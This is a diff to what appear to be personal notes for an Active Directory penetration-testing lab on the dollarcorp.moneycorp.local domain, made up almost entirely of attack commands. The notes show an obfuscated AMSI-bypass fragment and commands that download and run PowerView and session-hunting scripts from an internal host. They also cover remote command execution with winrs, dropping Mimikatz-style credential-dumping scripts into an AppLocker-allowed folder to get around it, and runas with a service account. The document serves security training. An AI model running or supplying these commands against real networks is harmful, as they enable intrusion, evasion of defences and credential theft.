@@ -9,13 +9,13 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 ```powershell
 iex(iwr 'http://172.16.100.48/PowerView.ps1' -useb)
 iex(iwr 'http://172.16.100.48/Invoke-SessionHunter.ps1' -useb)
-iwr http://172.16.100.48/Loader.exe -o C:\Users\Public\Loader.exe
-iwr http://172.16.100.48/Loader.exe -o C:\Users\Public\Loader.exe
+iex(iwr 'http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1' -useb)
 ```
 
 You must have administrator access to list sessions - netexec equivalent
 ```powershell
 Find-DomainUserLocation
+Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
@@ -53,7 +53,7 @@ Review AppLocker settings
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-
+Copy to AppLocker safe folder - can't dot source
 ```powershell
 Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 
@@ -61,4 +61,12 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneyc
 
 .\Invoke-MimiEx-keys.ps1
 .\Invoke-MimiEx-vault.ps1
+
+& 'C:\Program Files\Invoke-MimiEx-keys.ps1'
+& 'C:\Program Files\Invoke-MimiEx-vault.ps1'
+```
+
+Use `runas` to open cmd 
+```powershell
+runas /user:dcorp\svcadmin /netonly cmd
 ```
